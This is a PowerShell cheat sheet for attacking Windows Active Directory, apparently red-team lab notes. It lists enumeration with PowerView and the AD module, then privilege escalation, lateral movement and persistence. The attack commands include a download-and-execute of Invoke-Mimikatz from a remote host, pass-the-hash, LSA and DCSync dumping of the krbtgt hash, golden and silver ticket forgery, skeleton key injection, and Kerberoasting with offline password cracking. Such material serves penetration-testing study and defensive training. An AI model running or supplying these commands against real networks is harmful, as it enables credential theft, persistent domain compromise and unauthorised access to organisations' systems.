![Title](images/text02.png 'Text')

This cheat sheet contains common enumeration and attack methods for Windows Active Directory with the use of powershell.

Updating....
## TOC
- [Pre-requisites](#pre-requisites)
- [Enumeration](#enumeration)
  -  [Users Enumeration](#users-enumeration)
  -  [Domain Admins Enumeration](#domain-admins-enumeration)
  -  [Computers Enumeration](#computers-enumeration)
- []()


## Pre-requisites
### Using PowerView:
```powershell
. .\PowerView.ps1
```
Link: [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
### Using AD Module
```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```
Link: [AD Module](https://github.com/samratashok/ADModule)

# Enumeration:

### Users Enumeration:

- **With PowerView**:
```powershell
# Get the list of users
Get-NetUser
# Fitler by username
Get-NetUser -Username user01                          
# Grab the cn (common-name) from the list of users
Get-NetUser | select cn                           
# Grab the name from the list of users
Get-NetUser | select name

# List all properties
Get-UserProperty                                      
# Display when the passwords were set last time
Get-UserProperty –Properties pwdlastset               
# Display when the accounts were created
Get-UserProperty -Properties whencreated              
```
- **With AD Module**:
```powershell
# Get the list of users
Get-ADUser -Filter *

# Get the list of users with properties
Get-ADUser -Filter * -Properties *                                                                        
# List samaccountname and description for users
Get-ADUser -Filter * -Properties * | select Samaccountname,Description                                    
# Get the list of users from cn common-name
Get-ADUser -Filter * -Properties * | select cn                                                            
# Get the list of users from name
Get-ADUser -Filter * -Properties * | select name                                                          
# Displays when the password was set
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```
### Domain Admins Enumeration:

- **With PowerView:**
```powershell
# Get the current domain
Get-NetDomain                                         
# Get items from another domain
Get-NetDomain -Domain corporate.local                 
# Get the domain SID for the current domain
Get-DomainSID                                         
# Get domain policy for current domain
Get-DomainPolicy                                      
# See Attributes of the Domain Admins Group
Get-NetGroup -GroupName "Domain Admins" -FullData     
# Get Members of the Domain Admins group:
Get-NetGroupMember -GroupName "Domain Admins"         
```
- **With AD Module:**
```
# Get the current domain
Get-ADDomain                                         
# Get item from another domain
Get-ADDomain -Identity corporate.local                
# Get the domain SID for the current domain
(Get-ADDomain).DomainSID                              
# Get domain policy for current domain
(Get-DomainPolicy)."system access"                    
```

### Computers Enumeration:

- **With PowerView:**
```
Get-NetComputer                                       #Get the list of computers in the current domain
Get-NetComputer -FullData                             #Get the list of computers in the current domain with complete data 
Get-NetComputer -FullData | select operatingsystem    #Get the list of computers with their operating system
Get-NetComputer -FullData | select name               #Get the list of computers with their name
Get-NetComputer -Ping                                 #Send a ping to check if the computers are working
```
- **With AD Module:**
```
Get-ADComputer -Filter * -Properties *                                               #Get the list of computers in the current domain with complete data 
Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSystem   #Get the list of computers with their operating system
Get-ADComputer -Filter * | select Name                                               #Get the list of computers with their name
```

### Enumeration Groups and Members:

- **With PowerView:**
```
Get-NetGroup                                                               #Information about groups
Get-NetGroup *Admin*                                                       #Get all groups that contain the word "admin" in the group name 
Get-NetGroupMember -GroupName "Domain Admins" -Recurse                     #Get all members of the "Domain Admins" group
Get-NetGroupMember -GroupName "Enterprise Admins" –Domain domainxxx.local  #Query the root domain as the "Enterprise Admins" group exists only in the root of a forest
Get-NetGroup -UserName "user01"                                            #Get group membership for "user01"
```
- **With AD Module:**
```
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name                   #Get all groups that contain the word "admin" in the group name
Get-ADGroupMember -Identity "Domain Admins" -Recursive                     #Get all members of the "Domain Admins" group
Get-ADPrincipalGroupMembership -Identity user01                            #Get group membership for "user01"
```

### Enumeration Shares:

- **With PowerView:**
```
Invoke-ShareFinder -Verbose                                             #Find shares on hosts in the current domain                   
Invoke-FileFinder -Verbose                                              #Find sensitive files on computers in the current domain
Get-NetFileServer                                                       #Search file servers. Lot of users use to be logged in this kind of server
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose  #Find shares excluding standard, print and ipc.
```

### Enumeration OUI and GPO:

- **With PowerView:**
```
Get-NetOU                                                                   #Get the organizational units in a domain
Get-NetOU -FullData                                                         #Get the organizational units in a domain with full data 
Get-NetOU "ouiexample" | %{Get-NetComputer -ADSpath $_}                     #Get all computers from "ouiexample". Ouiexample --> organizational Units
Get-NetGPO                                                                  #Retrieve the list of GPOs present in the current domain
Get-NetGPO -ADSpath 'LDAP://cn={example},CN=example'                        #Enumerate GPO applied on the example OU
```
- **With AD Module:**
```
Get-ADOrganizationalUnit -Filter * -Properties *                            #Get the organizational units in a domain
```

### Enumeration ACL:

- **With PowerView:**
```
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs                         #Enumerates the ACLs for the users group
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs                 #Enumerates the ACLs for the Domain Admins group
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose               #Get the acl associated with a specific prefix
Invoke-ACLScanner -ResolveGUIDs                                             #Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "user"}     #check for modify rights/permissions for the user group
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPusers"} #check for modify rights/permissions for the RDPUsers group
```

### Domain Trust mapping:

- **With PowerView:**
```
Get-NetDomainTrust                                                          #Get the list of all trusts within the current domain
Get-NetDomainTrust -Domain us.domain.corporation.local                      #Get the list of all trusts within the indicated domain              
```
**Example:**

![Main Logo](images/Example_trust01.PNG 'Example01')

- **With AD Module:**
```
Get-ADTrust -Filter *                                                       #Get the list of all trusts within the current domain
Get-ADTrust -Identity us.domain.corporation.local                           #Get the list of all trusts within the indicated domain
```

### Domain Enumeration Forest:

- **With PowerView:**
```
Get-NetForestDomain                                                                #Get all domains in the current forest
Get-NetForestDomain -Forest corporation.local                                      #Get all domains in the current forest
Get-NetForestDomain -Verbose | Get-NetDomainTrust                                  #Maps all trusts
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'} #Maps only external trusts
```
**Example:**

![Main Logo](images/Example_trust02.PNG 'Example02')

- **With AD Module:**
```
(Get-ADForest).Domains                                                                                                 #Get all domains in the current forest
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} #Maps only external trusts
```

### Domain Enumeration User Hunting:

- **With PowerView:**
```
Find-LocalAdminAccess -Verbose                                    #Find all machines on the current domain where the current user has local admin access
Invoke-UserHunter                                                 #Looks for machines where a domain administrator is logged on
Invoke-UserHunter -CheckAccess                                    #Confirm access to the machine as an administrator
```

# Local Privilege Escalation:

## Using PowerUp:
```
. .\PowerUp.ps1
```
Link: ![PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
## BeRoot
```
.\beRoot.exe
```
Link: ![BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
## PrivEsc
```
. .\privesc.ps1
```
Link: ![PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)

- **With PowerUp:**
```
Invoke-AllChecks                                                         #Performs all checks
Get-ServiceUnquoted -Verbose                                             #Get services with unquoted paths and a space in their name.
Get-ModifiableServiceFile -Verbose                                       #Get services where the current user can write to its binary path or change arguments to the binary
Get-ModifiableService -Verbose                                           #Get the services whose configuration current user can modify
Invoke-ServiceAbuse -Name 'software_xxx' -UserName 'corporate\student01' #Let's add our current domain user to the local Administrators group 
```
- **With PrivEsc:**
```
Invoke-Privesc                                        #Performs all checks
```

# Lateral Movement

- **Powershell Remoting:**
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          #Execute whoami & hostname commands on the indicated server
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local #Execute the script Git-PassHashes.ps1 on the indicated server
```

- **Invoke-Mimikatz:**
```
iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           #Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"' #"Over pass the hash" generate tokens from hashes
```
# Persistence - Golden Ticket

- **Invoke-Mimikatz:**
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'                                                                #Execute mimikatz on DC as DA to get hashes
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'    #Golden Ticket
```

# Persistence - Silver Ticket

- **Invoke-Mimikatz:**
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'    #Silver Ticket for service HOST
```

# Persistence Skeleton Key

- **Invoke-Mimikatz:**
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local    #Command to inject a skeleton key
```

# DCSync

- **With PowerView and Invoke-Mimikatz:**
```
Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}  #Check if user01 has these permissions
Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose  #If you are a domain admin, you can grant this permissions to any user
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash of krbtgt
```

# Privilege Escalation - Kerberoast

**1. Enumeration with Powerview:**
```
Get-NetUser SPN           #Find user accounts used as Service accounts with PowerView
```
**2. Enumeration with AD Module:**
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName      #Find user accounts used as Service accounts
```
**3. Request a TGS:**
```
Add-Type -AssemblyNAme System.IdentityModel                                                                                    #Request a TGS - Phase 1
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" #Request a TGS - Phase 2
klist                                                                                                                          #Check if the TGS has been granted
```
**4. Export and crack TGS:**
```
Invoke-Mimikatz -Command '"kerberos::list /export"'                                                                                        #Export all tickets
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi #Crack the Service account password
```
